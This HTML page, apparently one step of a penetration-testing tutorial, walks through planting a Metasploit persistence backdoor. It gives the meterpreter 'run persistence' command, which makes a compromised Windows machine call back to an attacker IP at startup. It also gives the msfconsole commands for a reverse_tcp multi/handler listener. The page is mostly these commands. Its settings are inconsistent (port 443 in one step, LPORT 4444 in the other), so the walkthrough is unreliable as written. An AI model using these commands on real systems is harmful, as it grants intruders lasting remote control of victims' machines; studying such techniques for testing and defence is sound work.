<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>6. Persistence Backdoor</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>6. Persistence Backdoor</u></b></h1><br />This backdoor also answers a question many people ask like, once we get a meterpreter shell, can we shut down our machine? If we restart, will the connection be gone or still intact? .This backdoor needs only one one condition to be fulfilled. The target system should be out of its safest mode. i.e it shouldn’t  be turned off .<br /><br /><br />• I want my backdoor to start as soon as the system starts. So I chose ‘X’ option. <br />• After starting, I want it to make connection attempt to my attacker system every three seconds, so I kept the interval(i) as 3. <br />• The port on which connection should be made is 443. <br />• The option (r) is remote system’s IP address i.e the IP of the system to which the connection should be made.<br /><br />a) On "meterpreter" session from the privious step, run the following command.<br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;run&nbsp;persistence&nbsp;&nbsp;-X&nbsp;-p&nbsp;443&nbsp;-r&nbsp;192.168.12.41</div></div><br /><br /><br />b) Start multihandler server on attacker machine.<br /><br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$msfconsole</span></div></div><br /><br />In Metasploit run the following commands:<br /><br /><div class="codebox"><div class="codebox">msf5&nbsp;&gt;use&nbsp;exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br />msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;set&nbsp;payload&nbsp;windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf5&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LHOST&nbsp;192.168.12.41<br />msf5&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LPORT&nbsp;4444<br />msf5&gt;&nbsp;exploit<br /><br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/13-1.png" alt="images/13-1.png" /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>